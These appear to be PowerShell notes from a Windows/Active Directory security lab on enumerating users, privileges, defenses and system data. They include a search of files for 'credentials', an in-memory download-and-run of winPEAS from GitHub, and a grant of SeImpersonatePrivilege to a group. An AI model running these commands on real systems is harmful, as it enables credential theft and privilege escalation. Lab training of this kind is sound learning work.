# AD Lab 1

## Enumerate user account details

Get-LocalUser #Get-LocalUser -Name \* | Select \* Get-LocalGroup Get-LocalGroupMember -name "ITGroup"

Get-ACL "C:\Users\Administrator" | Format-List

whoami /priv

$cuaccess = \[System.Security.Principal.WindowsIdentity]::GetCurrent() $cuprivilege=New-Object System.Security.Principal.WindowsPrincipal($cuaccess) $cuprivilege.IsInRole(\[System.Security.Principal.WindowsBuiltInRole]::Administrator)

## Understand how to check the defenses

## in CMD

\#sc query windefend

## Get-Service -Name _defence_

Get-Service -Name \*D

Get-MpPreference #Get-MpComputerStatus #Get-MpThreatCatalog

## Enumerate system information

Get-ComputerInfo Get-PSDrive -PSProvider FileSystem | Select-Object Name,Root #Get-ChildItem -Path C:\ -Recurse -Directory -Force -ErrorAction SilentlyContinue |

## Where-Object { $\_.FullName -notlike "C:\Windows\*" } |

## Select-Object FullName

## Checking for possible file content that could be useful for us

\#Get-ChildItem -Filter \*.txt -Path C:\ -Recurse -ErrorAction SilentlyContinue | Select-String "credentials"

## Enumerate user account details

Get-LocalGroupMember -Name ITGroup

net user "Cassandra Bell"

## Learn how to check the Registry

<#

$url="https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany\_ofs.exe"

$wp=\[System.Reflection.Assembly]::Load(\[byte\[]]\(Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content)) \[winPEAS.Program]::Main("")

$folder=Read-Host "Folder" $user=Read-Host "Userid" $permission=(Get-ACL $folder).Access | ?{IdentityReference -match $user} | Select IdentityReference,FileSystemRights if ($permission) { $permission | % {Write-Host "$($_.IdentityReference) has '$($_.FileSystemRights)' rights on folder $Folder"} } else { Write-Host "$user doesn't have any permissions on $Folder" }

\#>

## One extra help

Install-Module 'Carbon' -AllowClobber Import-Module carbon Grant-CPrivilege -Identity ITGroup -Privilege SeImpersonatePrivilege Get-CPrivilege ITGroup
